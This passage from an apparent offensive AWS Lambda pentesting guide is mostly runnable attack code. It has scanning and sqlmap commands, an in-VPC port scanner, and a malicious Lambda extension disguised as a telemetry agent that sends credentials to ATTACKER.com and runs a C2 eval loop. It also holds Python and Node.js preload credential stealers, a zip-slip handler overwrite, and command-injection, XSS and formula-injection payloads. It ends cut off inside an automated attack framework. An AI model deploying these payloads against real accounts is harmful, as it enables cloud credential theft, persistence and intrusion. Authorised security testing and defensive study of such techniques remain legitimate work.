  -w <(echo -e "dev\nstaging\nprod\nv1\nv2\nv3\ntest\nqa\nuat\nbeta\nalpha\ninternal") \
  -mc 200,301,403

# ============================================
# Gobuster — Directory & API enumeration
# ============================================

gobuster dir \
  -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -t 50 \
  -o gobuster-results.txt

# Vhost scanning for API Gateway custom domains
gobuster vhost \
  -u "https://api.target.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Method 8 — Nuclei (Automated Vulnerability Scanning)

```bash [Nuclei for Lambda/API Gateway]
# ============================================
# Nuclei — Template-based vulnerability scanner
# ============================================

# Update templates
nuclei -update-templates

# Scan API Gateway endpoints
nuclei -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/" \
  -t nuclei-templates/http/ \
  -severity critical,high,medium \
  -o nuclei-results.txt

# AWS-specific templates
nuclei -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/" \
  -tags aws,cloud \
  -o nuclei-aws-results.txt

# Custom Lambda/API Gateway template
cat > /tmp/lambda-misconfig.yaml << 'EOF'
id: lambda-function-url-open
info:
  name: Lambda Function URL - No Authentication
  author: pentester
  severity: high
  description: Lambda Function URL configured without authentication
  tags: aws,lambda,misconfig

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: status
        status:
          - 200
          - 403
      - type: word
        words:
          - "x-amzn-requestid"
        part: header
    matchers-condition: and
EOF

nuclei -u "https://URL_ID.lambda-url.us-east-1.on.aws/" \
  -t /tmp/lambda-misconfig.yaml

# Scan multiple API endpoints from file
cat > /tmp/api-targets.txt << 'EOF'
https://abc123.execute-api.us-east-1.amazonaws.com/prod/api/users
https://abc123.execute-api.us-east-1.amazonaws.com/prod/api/admin
https://abc123.execute-api.us-east-1.amazonaws.com/prod/api/login
https://xyz789.lambda-url.us-east-1.on.aws/
EOF

nuclei -l /tmp/api-targets.txt \
  -t nuclei-templates/ \
  -severity critical,high \
  -rate-limit 10 \
  -o nuclei-full-results.txt
```

### Method 9 — SQLMap (Automated SQL Injection)

```bash [SQLMap for Lambda APIs]
# ============================================
# SQLMap — Automated SQL Injection
# ============================================

# GET parameter injection
sqlmap -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/users?id=1" \
  --batch \
  --random-agent \
  --level 3 \
  --risk 2 \
  --dbs

# POST body injection (JSON)
sqlmap -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/login" \
  --method POST \
  --data '{"username":"admin","password":"test"}' \
  --headers "Content-Type: application/json" \
  --batch \
  --random-agent \
  --dbs

# With authentication header
sqlmap -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/users?id=1" \
  --headers "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.xxx" \
  --batch \
  --dbs

# Dump all databases
sqlmap -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/users?id=1" \
  --batch --random-agent \
  --dump-all

# OS shell via SQL injection (if function connects to RDS/MySQL)
sqlmap -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/users?id=1" \
  --batch --random-agent \
  --os-shell

# From Burp Suite saved request
sqlmap -r /tmp/burp-request.txt --batch --dbs

# Through proxy (Burp)
sqlmap -u "https://API_ID.execute-api.us-east-1.amazonaws.com/prod/api/users?id=1" \
  --proxy http://127.0.0.1:8080 \
  --batch --dbs
```

### Method 10 — Nmap (Network Scanning from VPC Lambda)

```bash [Nmap via Lambda]
# If you achieve code execution on a VPC-attached Lambda,
# use it as a pivot point for internal network scanning

# Upload nmap binary as a Lambda Layer or via /tmp
# (Lambda has limited tools, so bring your own)

# Alternative: Use Python for port scanning within Lambda
cat > /tmp/scanner.py << 'PYEOF'
import socket
import json
import concurrent.futures

def handler(event, context):
    target = event.get('target', '10.0.1.1')
    ports = event.get('ports', list(range(1, 1025)))
    timeout = event.get('timeout', 0.5)
    
    open_ports = []
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            sock.close()
            if result == 0:
                return port
        except:
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, p): p for p in ports}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)
    
    # Attempt banner grabbing on open ports
    banners = {}
    for port in open_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            banners[port] = banner[:200]
        except:
            banners[port] = 'N/A'
    
    return {
        'target': target,
        'open_ports': sorted(open_ports),
        'banners': banners
    }
PYEOF

# Deploy as Lambda function in the target VPC
zip /tmp/scanner.zip /tmp/scanner.py

aws lambda create-function \
  --function-name network-scanner \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/LambdaVPCRole \
  --handler scanner.handler \
  --zip-file fileb:///tmp/scanner.zip \
  --timeout 300 \
  --memory-size 512 \
  --vpc-config SubnetIds=subnet-xxx,SecurityGroupIds=sg-xxx

# Scan internal network
aws lambda invoke \
  --function-name network-scanner \
  --payload '{"target":"10.0.1.50","ports":[22,80,443,3306,5432,6379,8080,27017]}' \
  /tmp/scan-results.json

cat /tmp/scan-results.json | jq .

# Scan a range
for ip in $(seq 1 254); do
  aws lambda invoke \
    --function-name network-scanner \
    --payload "{\"target\":\"10.0.1.$ip\",\"ports\":[22,80,443,3306,8080]}" \
    "/tmp/scan-10.0.1.$ip.json" &
done
wait

# Aggregate results
for f in /tmp/scan-10.0.1.*.json; do
  ports=$(jq -r '.open_ports | join(",")' "$f" 2>/dev/null)
  if [ ! -z "$ports" ] && [ "$ports" != "" ]; then
    target=$(jq -r '.target' "$f")
    echo "$target: $ports"
  fi
done
```

---

## Advanced Exploitation Techniques

### Technique 1 — Lambda Extension Injection

::note
Lambda Extensions run as **separate processes** alongside your function. They persist across warm invocations and have access to the same environment variables and credentials.
::

```bash [Lambda Extension Attack]
#!/bin/bash
# Create a malicious Lambda Extension that:
# 1. Runs as a separate process alongside the function
# 2. Exfiltrates credentials continuously
# 3. Acts as a C2 agent

mkdir -p /tmp/ext-layer/extensions

cat > /tmp/ext-layer/extensions/telemetry-agent << 'EXTEOF'
#!/bin/bash
# Malicious Lambda Extension disguised as telemetry agent

RUNTIME_API="${AWS_LAMBDA_RUNTIME_API}"

# Register with Extensions API
RESPONSE_HEADERS=$(mktemp)
curl -sS -o /dev/null -D "$RESPONSE_HEADERS" \
  -X POST \
  "http://${RUNTIME_API}/2020-01-01/extension/register" \
  -H "Lambda-Extension-Name: telemetry-agent" \
  -d '{"events": ["INVOKE", "SHUTDOWN"]}'

EXTENSION_ID=$(grep -i "lambda-extension-identifier" "$RESPONSE_HEADERS" | tr -d '[:space:]' | cut -d: -f2)

# Initial credential exfiltration
CREDS=$(python3 -c "
import json, os, urllib.request
data = json.dumps({
    'access_key': os.environ.get('AWS_ACCESS_KEY_ID', ''),
    'secret_key': os.environ.get('AWS_SECRET_ACCESS_KEY', ''),
    'token': os.environ.get('AWS_SESSION_TOKEN', ''),
    'function': os.environ.get('AWS_LAMBDA_FUNCTION_NAME', ''),
    'region': os.environ.get('AWS_REGION', ''),
    'handler': os.environ.get('_HANDLER', ''),
}).encode()
req = urllib.request.Request('https://ATTACKER.com/lambda-ext', data=data, headers={'Content-Type':'application/json'})
try: urllib.request.urlopen(req, timeout=3)
except: pass
" 2>/dev/null) &

# C2 loop — check for commands on each invocation
while true; do
  # Wait for next event
  EVENT=$(curl -sS \
    "http://${RUNTIME_API}/2020-01-01/extension/event/next" \
    -H "Lambda-Extension-Identifier: ${EXTENSION_ID}")
  
  EVENT_TYPE=$(echo "$EVENT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('eventType',''))" 2>/dev/null)
  
  if [ "$EVENT_TYPE" == "SHUTDOWN" ]; then
    exit 0
  fi
  
  # Check C2 for commands (runs on each INVOKE event)
  CMD=$(curl -sS "https://ATTACKER.com/c2/cmd?func=${AWS_LAMBDA_FUNCTION_NAME}" 2>/dev/null)
  if [ ! -z "$CMD" ] && [ "$CMD" != "none" ]; then
    RESULT=$(eval "$CMD" 2>&1)
    curl -sS -X POST "https://ATTACKER.com/c2/result" \
      -H "Content-Type: application/json" \
      -d "{\"func\":\"${AWS_LAMBDA_FUNCTION_NAME}\",\"result\":\"$(echo $RESULT | base64 -w0)\"}" \
      2>/dev/null
  fi
done
EXTEOF

chmod +x /tmp/ext-layer/extensions/telemetry-agent

# Package as layer
cd /tmp/ext-layer && zip -r ../telemetry-ext.zip .

# Deploy
LAYER_ARN=$(aws lambda publish-layer-version \
  --layer-name "telemetry-agent-v2" \
  --description "APM telemetry collection agent" \
  --zip-file fileb:///tmp/telemetry-ext.zip \
  --compatible-runtimes python3.9 python3.10 python3.11 nodejs18.x nodejs20.x \
  --query 'LayerVersionArn' --output text)

echo "[+] Extension Layer: $LAYER_ARN"

# Attach to target function
aws lambda update-function-configuration \
  --function-name target-function \
  --layers $LAYER_ARN
```

### Technique 2 — Environment Variable Injection for Code Execution

```bash [Env Var Code Execution]
# Lambda runtimes respect certain environment variables
# that can be abused for code execution

# ============================================
# Python Runtime — PYTHONPATH injection
# ============================================

# Create malicious Python module
mkdir -p /tmp/pyinject/python
cat > /tmp/pyinject/python/sitecustomize.py << 'PYEOF'
# sitecustomize.py — Auto-executed on Python startup
import os, json, urllib.request

creds = json.dumps({
    'key': os.environ.get('AWS_ACCESS_KEY_ID'),
    'secret': os.environ.get('AWS_SECRET_ACCESS_KEY'),
    'token': os.environ.get('AWS_SESSION_TOKEN')
}).encode()

try:
    req = urllib.request.Request(
        'https://ATTACKER.com/py-inject',
        data=creds,
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req, timeout=2)
except:
    pass
PYEOF

cd /tmp/pyinject && zip -r ../pyinject.zip .

LAYER_ARN=$(aws lambda publish-layer-version \
  --layer-name "python-common-utils" \
  --zip-file fileb:///tmp/pyinject.zip \
  --compatible-runtimes python3.9 python3.10 \
  --query 'LayerVersionArn' --output text)

# Inject via environment variable
aws lambda update-function-configuration \
  --function-name target-function \
  --layers $LAYER_ARN \
  --environment '{
    "Variables": {
      "PYTHONPATH": "/opt/python",
      "EXISTING_VAR": "preserved-value"
    }
  }'

# ============================================
# Node.js Runtime — NODE_PATH / NODE_OPTIONS
# ============================================

mkdir -p /tmp/nodeinject/nodejs/node_modules
cat > /tmp/nodeinject/nodejs/node_modules/preload.js << 'JSEOF'
// Preloaded via NODE_OPTIONS=--require=/opt/nodejs/node_modules/preload.js
const https = require('https');

const data = JSON.stringify({
  key: process.env.AWS_ACCESS_KEY_ID,
  secret: process.env.AWS_SECRET_ACCESS_KEY,
  token: process.env.AWS_SESSION_TOKEN,
  func: process.env.AWS_LAMBDA_FUNCTION_NAME
});

const req = https.request({
  hostname: 'ATTACKER.com',
  path: '/node-inject',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  timeout: 2000
}, () => {});
req.write(data);
req.end();
JSEOF

cd /tmp/nodeinject && zip -r ../nodeinject.zip .

LAYER_ARN=$(aws lambda publish-layer-version \
  --layer-name "nodejs-monitoring" \
  --zip-file fileb:///tmp/nodeinject.zip \
  --compatible-runtimes nodejs18.x nodejs20.x \
  --query 'LayerVersionArn' --output text)

aws lambda update-function-configuration \
  --function-name target-node-function \
  --layers $LAYER_ARN \
  --environment '{
    "Variables": {
      "NODE_OPTIONS": "--require=/opt/nodejs/node_modules/preload.js"
    }
  }'
```

### Technique 3 — S3 Trigger Poisoning

```bash [S3 Event Trigger Poisoning]
# If a Lambda function is triggered by S3 events,
# uploading a malicious file can trigger code execution

# 1. Identify S3 triggers
aws lambda list-event-source-mappings \
  --function-name target-function

# Check S3 bucket notification configuration
aws s3api get-bucket-notification-configuration \
  --bucket target-bucket

# 2. Analyze the function code to understand what it does with uploaded files
# Common patterns:
# - Image processing (ImageMagick → CVE-2023-38831, etc.)
# - CSV/Excel parsing (formula injection)
# - XML parsing (XXE)
# - Archive extraction (zip slip)
# - Log processing (log injection → command injection)

# 3. Craft malicious payload based on processing type

# Example: XML file that triggers XXE
cat > /tmp/xxe-payload.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/task/handler.py">
]>
<data>
  <item>&xxe;</item>
</data>
XMLEOF

# Upload to trigger Lambda
aws s3 cp /tmp/xxe-payload.xml s3://target-bucket/uploads/data.xml

# Example: CSV with formula injection
cat > /tmp/malicious.csv << 'CSVEOF'
Name,Email,Notes
=cmd|'/C curl https://ATTACKER.com/csv-rce'!A0,test@test.com,normal
=HYPERLINK("https://ATTACKER.com/phish","Click Here"),admin@target.com,important
CSVEOF

aws s3 cp /tmp/malicious.csv s3://target-bucket/imports/users.csv

# Example: Zip slip (path traversal via archive)
python3 << 'PYEOF'
import zipfile
import io

# Create zip with path traversal
zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w') as zf:
    # Overwrite Lambda handler code
    zf.writestr(
        '../../../var/task/handler.py',
        '''
import os, json, urllib.request

def handler(event, context):
    creds = json.dumps({
        'key': os.environ.get('AWS_ACCESS_KEY_ID'),
        'secret': os.environ.get('AWS_SECRET_ACCESS_KEY'),
        'token': os.environ.get('AWS_SESSION_TOKEN')
    }).encode()
    urllib.request.urlopen(
        urllib.request.Request('https://ATTACKER.com/zipslip', data=creds)
    )
    return {'statusCode': 200}
'''
    )

with open('/tmp/zipslip.zip', 'wb') as f:
    f.write(zip_buffer.getvalue())
print("[+] Zip slip payload created: /tmp/zipslip.zip")
PYEOF

aws s3 cp /tmp/zipslip.zip s3://target-bucket/uploads/archive.zip
```

### Technique 4 — DynamoDB Stream Event Injection

```python [DynamoDB Stream Poisoning]
import boto3
import json

"""
If a Lambda function processes DynamoDB Stream events,
inject malicious data into the table to trigger processing
"""

dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('users')

# Inject command injection payload via DynamoDB record
# The Lambda function will process this record
payloads = [
    # SQL Injection (if Lambda queries another DB with this data)
    {"id": "inject-1", "name": "'; DROP TABLE users;--", "email": "test@test.com"},
    
    # XSS (if Lambda generates HTML/emails)
    {"id": "inject-2", "name": "<script>fetch('https://ATTACKER.com/xss?c='+document.cookie)</script>", "email": "xss@test.com"},
    
    # Command Injection (if Lambda uses this in shell commands)
    {"id": "inject-3", "name": "$(curl https://ATTACKER.com/rce?e=$(env|base64))", "email": "rce@test.com"},
    
    # SSTI (if Lambda uses templates)
    {"id": "inject-4", "name": "{{7*7}}", "email": "ssti@test.com"},
    
    # Path Traversal
    {"id": "inject-5", "name": "../../etc/passwd", "email": "traversal@test.com"},
    
    # LDAP Injection
    {"id": "inject-6", "name": "*)(uid=*))(|(uid=*", "email": "ldap@test.com"},
]

for payload in payloads:
    print(f"[*] Injecting payload: {payload['id']}")
    table.put_item(Item=payload)

print("[+] All payloads injected. Monitor Lambda CloudWatch logs for results.")

# Monitor CloudWatch logs for the Lambda function
logs_client = boto3.client('logs')
log_group = '/aws/lambda/dynamodb-processor'

# Get latest log events
response = logs_client.filter_log_events(
    logGroupName=log_group,
    startTime=int((datetime.now() - timedelta(minutes=5)).timestamp() * 1000),
    limit=50
)

for event in response['events']:
    print(f"[LOG] {event['message']}")
```

### Technique 5 — SQS Message Injection

```python [SQS Poisoning Attack]
import boto3
import json

"""
Inject malicious messages into SQS queues that trigger Lambda functions
"""

sqs = boto3.client('sqs')
queue_url = 'https://sqs.us-east-1.amazonaws.com/123456789012/order-queue'

# Craft malicious messages based on expected format
messages = [
    # Command injection via order processing
    {
        "orderId": "12345; curl https://ATTACKER.com/sqs-rce?e=$(env|base64 -w0) #",
        "item": "widget",
        "quantity": 1
    },
    # XXE via XML processing
    {
        "orderId": "12346",
        "xmlData": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/task/handler.py">]><order>&xxe;</order>'
    },
    # Prototype pollution via JSON merge
    {
        "__proto__": {"isAdmin": True, "role": "admin"},
        "orderId": "12347"
    },
    # SSRF via URL parameter
    {
        "orderId": "12348",
        "callbackUrl": "http://169.254.170.2/v2/credentials/"
    },
    # Path traversal
    {
        "orderId": "12349",
        "receiptPath": "../../../../var/task/handler.py"
    }
]

for i, msg in enumerate(messages):
    response = sqs.send_message(
        QueueUrl=queue_url,
        MessageBody=json.dumps(msg),
        MessageAttributes={
            'InjectionTest': {
                'DataType': 'String',
                'StringValue': f'payload-{i}'
            }
        }
    )
    print(f"[+] Sent message {i}: {response['MessageId']}")

# Send batch messages
entries = []
for i, msg in enumerate(messages):
    entries.append({
        'Id': str(i),
        'MessageBody': json.dumps(msg)
    })

sqs.send_message_batch(
    QueueUrl=queue_url,
    Entries=entries
)
print(f"[+] Batch sent: {len(entries)} messages")
```

---

## Comprehensive Lambda Pentest Automation

### All-in-One Attack Script

```python [lambda_attacker.py]
#!/usr/bin/env python3
"""
Lambda Pentest Automation Framework
Combines enumeration, analysis, and exploitation
"""

import boto3
import json
import os
import sys
import re
import zipfile
import io
import urllib.request
import concurrent.futures
from datetime import datetime, timedelta
from pathlib import Path

class LambdaAttacker:
    def __init__(self, profile=None, region=None, access_key=None, secret_key=None, session_token=None):
        session_args = {}
        if profile:
            session_args['profile_name'] = profile
        if region:
            session_args['region_name'] = region
        if access_key:
            session_args['aws_access_key_id'] = access_key
            session_args['aws_secret_access_key'] = secret_key
            if session_token:
                session_args['aws_session_token'] = session_token
        
        self.session = boto3.Session(**session_args)
        self.lambda_client = self.session.client('lambda')
        self.iam_client = self.session.client('iam')
        self.sts_client = self.session.client('sts')
        
        self.identity = self.sts_client.get_caller_identity()
        self.account_id = self.identity['Account']
        self.region = self.session.region_name
        
        self.results = {
            'identity': self.identity,
            'functions': [],
            'vulnerabilities': [],
            'escalation_paths': [],
            'secrets_found': [],
            'attack_surface': []
        }
        
        self.output_dir = f"./lambda-pentest-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(f"{self.output_dir}/code", exist_ok=True)
        os.makedirs(f"{self.output_dir}/roles", exist_ok=True)
    
    def banner(self):
        print("""
╔══════════════════════════════════════════════════╗
║         Lambda Pentest Automation Framework       ║
║              AWS Serverless Attacker              ║
╚══════════════════════════════════════════════════╝
        """)
        print(f"  Account:  {self.account_id}")
        print(f"  Identity: {self.identity['Arn']}")
        print(f"  Region:   {self.region}")
        print(f"  Output:   {self.output_dir}")
        print()

    # ==========================================
    # ENUMERATION
    # ==========================================
    
    def enum_functions(self):
        """Enumerate all Lambda functions"""
        print("[*] Phase 1: Enumerating Lambda functions...")
        
        functions = []
        paginator = self.lambda_client.get_paginator('list_functions')
        for page in paginator.paginate():
            functions.extend(page['Functions'])
        
        print(f"[+] Found {len(functions)} functions")
        
        for func in functions:
            name = func['FunctionName']
            print(f"\n  [*] Analyzing: {name}")
            
            func_data = {
                'name': name,
                'runtime': func.get('Runtime', 'N/A'),
                'role': func.get('Role', ''),
                'handler': func.get('Handler', ''),
                'timeout': func.get('Timeout', 0),
                'memory': func.get('MemorySize', 0),
                'last_modified': func.get('LastModified', ''),
                'code_size': func.get('CodeSize', 0),
                'vpc': func.get('VpcConfig', {}).get('VpcId', None),
                'layers': [l['Arn'] for l in func.get('Layers', [])],
                'env_vars': {},
                'resource_policy': None,
                'function_url': None,
                'event_sources': [],
                'role_permissions': {},
                'vulnerabilities': []
            }
            
            # Get full config with env vars
            try:
                config = self.lambda_client.get_function_configuration(FunctionName=name)
                func_data['env_vars'] = config.get('Environment', {}).get('Variables', {})
            except Exception as e:
                print(f"    [-] Config error: {e}")
            
            # Analyze environment variables for secrets
            self._check_secrets(func_data)
            
            # Check resource policy
            self._check_resource_policy(func_data)
            
            # Check function URL
            self._check_function_url(func_data)
            
            # Check event sources
            self._check_event_sources(func_data)
            
            # Download and analyze code
            self._download_code(func_data)
            
            # Analyze execution role
            self._analyze_role(func_data)
            
            self.results['functions'].append(func_data)
        
        return functions
    
    def _check_secrets(self, func_data):
        """Check environment variables for secrets"""
        secret_patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_temp_key': r'ASIA[0-9A-Z]{16}',
            'private_key': r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----',
            'password': r'(?i)(password|passwd|pwd)\s*[=:]\s*\S+',
            'api_key': r'(?i)(api[_-]?key|apikey)\s*[=:]\s*\S+',
            'secret': r'(?i)(secret|token|auth)\s*[=:]\s*\S+',
            'connection_string': r'(?i)(mongodb|mysql|postgres|redis):\/\/[^\s]+',
            'jwt_secret': r'(?i)jwt[_-]?secret\s*[=:]\s*\S+'
        }
        
        for key, value in func_data['env_vars'].items():
            for pattern_name, pattern in secret_patterns.items():
                if re.search(pattern, value) or re.search(r'(?i)(password|secret|key|token|credential|auth|jwt|api)', key):
                    finding = {
                        'function': func_data['name'],
                        'type': 'secret_in_env_var',
                        'severity': 'CRITICAL',
                        'key': key,
                        'value_preview': value[:50] + '...' if len(value) > 50 else value,
                        'pattern_matched': pattern_name
                    }
                    self.results['secrets_found'].append(finding)
                    func_data['vulnerabilities'].append(finding)
                    print(f"    [!!!] SECRET: {key} = {value[:30]}...")
                    break
    
    def _check_resource_policy(self, func_data):
        """Check for public or cross-account access"""
        try:
            policy = self.lambda_client.get_policy(FunctionName=func_data['name'])
            policy_doc = json.loads(policy['Policy'])
            func_data['resource_policy'] = policy_doc
            
            for statement in policy_doc.get('Statement', []):
                principal = statement.get('Principal', {})
                
                if principal == '*' or (isinstance(principal, dict) and principal.get('AWS') == '*'):
                    vuln = {
                        'function': func_data['name'],
                        'type': 'public_access',
                        'severity': 'CRITICAL',
                        'detail': 'Function is publicly invocable (Principal: *)'
                    }
                    self.results['vulnerabilities'].append(vuln)
                    func_data['vulnerabilities'].append(vuln)
                    print(f"    [!!!] PUBLICLY ACCESSIBLE!")
                
                elif isinstance(principal, dict) and 'AWS' in principal:
                    aws_principal = principal['AWS'] if isinstance(principal['AWS'], list) else [principal['AWS']]
                    for p in aws_principal:
                        if ':' in str(p):
                            account = str(p).split(':')[4] if len(str(p).split(':')) > 4 else ''
                            if account and account != self.account_id:
                                vuln = {
                                    'function': func_data['name'],
                                    'type': 'cross_account_access',
                                    'severity': 'HIGH',
                                    'detail': f'Cross-account access: {p}'
                                }
                                self.results['vulnerabilities'].append(vuln)
                                self.results['attack_surface'].append(vuln)
        except:
            pass
    
    def _check_function_url(self, func_data):
        """Check for function URL configuration"""
        try:
            url_config = self.lambda_client.get_function_url_config(FunctionName=func_data['name'])
            func_data['function_url'] = {
                'url': url_config.get('FunctionUrl'),
                'auth_type': url_config.get('AuthType')
            }
            
            if url_config.get('AuthType') == 'NONE':
                vuln = {
                    'function': func_data['name'],
                    'type': 'unauthenticated_function_url',
                    'severity': 'HIGH',
                    'detail': f"URL: {url_config['FunctionUrl']} (No Auth)"
                }
                self.results['vulnerabilities'].append(vuln)
                self.results['attack_surface'].append(vuln)
                print(f"    [!] Unauthenticated URL: {url_config['FunctionUrl']}")
        except:
            pass
    
    def _check_event_sources(self, func_data):
        """Check event source mappings"""
        try:
            mappings = self.lambda_client.list_event_source_mappings(
                FunctionName=func_data['name']
            )
            for mapping in mappings.get('EventSourceMappings', []):
                func_data['event_sources'].append({
                    'arn': mapping.get('EventSourceArn'),
                    'state': mapping.get('State'),
                    'batch_size': mapping.get('BatchSize')
                })
        except:
            pass
    
    def _download_code(self, func_data):
        """Download and analyze function source code"""
        try:
            func = self.lambda_client.get_function(FunctionName=func_data['name'])
            code_url = func['Code']['Location']
            
            code_dir = f"{self.output_dir}/code/{func_data['name']}"
            os.makedirs(code_dir, exist_ok=True)
            
            urllib.request.urlretrieve(code_url, f"{code_dir}/code.zip")
            
            with zipfile.ZipFile(f"{code_dir}/code.zip", 'r') as z:
                z.extractall(code_dir)
            os.remove(f"{code_dir}/code.zip")
            
            # Scan code for vulnerabilities
            self._scan_code(func_data, code_dir)
            
            print(f"    [+] Code saved: {code_dir}")
        except Exception as e:
            print(f"    [-] Code download failed: {e}")
    
    def _scan_code(self, func_data, code_dir):
        """Scan downloaded code for security issues"""
        vuln_patterns = {
            'command_injection': [
                r'subprocess\.(?:run|call|Popen|check_output)\s*\([^)]*shell\s*=\s*True',
                r'os\.system\s*\(',
                r'os\.popen\s*\(',
                r'exec\s*\(',
                r'eval\s*\(',
                r'child_process\.exec\s*\(',
            ],
            'sql_injection': [
                r'f"[^"]*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)[^"]*{',
                r'f\'[^\']*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)[^\']*{',
                r'"[^"]*%s[^"]*"\s*%',
                r'\.format\s*\([^)]*\)\s*$',
                r'\+\s*(?:request|event|query)',
            ],
            'ssrf': [
                r'urllib\.request\.urlopen\s*\(',
                r'requests\.(?:get|post|put|delete)\s*\(',
                r'http\.request\s*\(',
                r'fetch\s*\(',
                r'axios\s*\.',
            ],
            'deserialization': [
                r'pickle\.loads?\s*\(',
                r'yaml\.(?:load|unsafe_load)\s*\(',
                r'json\.loads?\s*\([^)]*event',
                r'marshal\.loads?\s*\(',
            ],
            'hardcoded_secrets': [
                r'AKIA[0-9A-Z]{16}',
                r'(?i)password\s*=\s*["\'][^"\']+["\']',
                r'(?i)secret\s*=\s*["\'][^"\']+["\']',
                r'(?i)api[_-]?key\s*=\s*["\'][^"\']+["\']',
                r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
            ],
            'path_traversal': [
                r'os\.path\.join\s*\([^)]*event',
                r'open\s*\([^)]*event',
                r'readFile\s*\([^)]*event',
            ]
        }
        
        for root, dirs, files in os.walk(code_dir):
            for filename in files:
                filepath = os.path.join(root, filename)
                if not filename.endswith(('.py', '.js', '.ts', '.java', '.go', '.rb', '.yaml', '.yml', '.json', '.env', '.config')):
                    continue
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        lines = content.split('\n')
                    
                    for vuln_type, patterns in vuln_patterns.items():
                        for pattern in patterns:
                            for i, line in enumerate(lines, 1):
                                if re.search(pattern, line):
                                    vuln = {
                                        'function': func_data['name'],
                                        'type': f'code_{vuln_type}',
                                        'severity': 'HIGH',
                                        'file': os.path.relpath(filepath, code_dir),
                                        'line': i,
                                        'code': line.strip()[:200],
                                        'pattern': pattern
                                    }
                                    self.results['vulnerabilities'].append(vuln)
                                    func_data['vulnerabilities'].append(vuln)
                except:
                    pass
    
    def _analyze_role(self, func_data):
        """Analyze execution role permissions"""
        role_arn = func_data['role']
        if not role_arn:
            return
        
        role_name = role_arn.split('/')[-1]
        
        try:
            # Get trust policy
            role = self.iam_client.get_role(RoleName=role_name)
            trust_policy = role['Role']['AssumeRolePolicyDocument']
            
            # Check attached managed policies
            attached = self.iam_client.list_attached_role_policies(RoleName=role_name)
            
            dangerous_policies = [
                'AdministratorAccess', 'PowerUserAccess', 'IAMFullAccess',
                'AmazonS3FullAccess', 'AmazonDynamoDBFullAccess',
                'AmazonRDSFullAccess', 'AmazonEC2FullAccess',
                'SecretsManagerReadWrite', 'AmazonSSMFullAccess'
            ]
            
            for policy in attached['AttachedPolicies']:
                if policy['PolicyName'] in dangerous_policies:
                    vuln = {
                        'function': func_data['name'],
                        'type': 'overprivileged_role',
                        'severity': 'CRITICAL',
                        'detail': f"Role: {role_name} | Policy: {policy['PolicyName']}"
                    }
                    self.results['vulnerabilities'].append(vuln)
                    self.results['escalation_paths'].append(vuln)
                    print(f"    [!!!] Over-privileged: {policy['PolicyName']}")
            
            # Check inline policies for wildcards
            inline_policies = self.iam_client.list_role_policies(RoleName=role_name)
            for policy_name in inline_policies['PolicyNames']:
                doc = self.iam_client.get_role_policy(
                    RoleName=role_name, PolicyName=policy_name
                )['PolicyDocument']
                
                for statement in doc.get('Statement', []):
                    actions = statement.get('Action', [])
                    resources = statement.get('Resource', [])
                    effect = statement.get('Effect', '')
                    
                    if isinstance(actions, str):
                        actions = [actions]
                    if isinstance(resources, str):
                        resources = [resources]
                    
                    if effect == 'Allow':
                        if '*' in actions:
                            vuln = {
                                'function': func_data['name'],
                                'type': 'wildcard_action',
                                'severity': 'CRITICAL',
                                'detail': f"Role: {role_name} | Action: * | Resource: {resources}"
                            }
                            self.results['vulnerabilities'].append(vuln)
                            self.results['escalation_paths'].append(vuln)
                        
                        # Check for specific dangerous permissions
                        for action in actions:
                            if any(dangerous in action for dangerous in [
                                'iam:*', 'iam:Put', 'iam:Attach', 'iam:Create',
                                'iam:Update', 'iam:PassRole', 'lambda:*',
                                'lambda:Create', 'lambda:Update', 'sts:AssumeRole'
                            ]):
                                path = {
                                    'function': func_data['name'],
                                    'type': 'privesc_permission',
                                    'severity': 'CRITICAL',
                                    'detail': f"Role: {role_name} | Action: {action}"
                                }
                                self.results['escalation_paths'].append(path)
            
            func_data['role_permissions'] = {
                'role_name': role_name,
                'trust_policy': trust_policy,
                'attached_policies': [p['PolicyName'] for p in attached['AttachedPolicies']],
                'inline_policies': inline_policies['PolicyNames']
            }
            
        except Exception as e:
            print(f"    [-] Role analysis error: {e}")
    
    # ==========================================
    # EXPLOITATION
    # ==========================================
    
    def check_privesc(self):
        """Check for Lambda-based privilege escalation paths"""
        print("\n[*] Phase 2: Checking privilege escalation paths...")
        
        paths = []
        
        # Check current user's permissions
        try:
            # Try to list functions
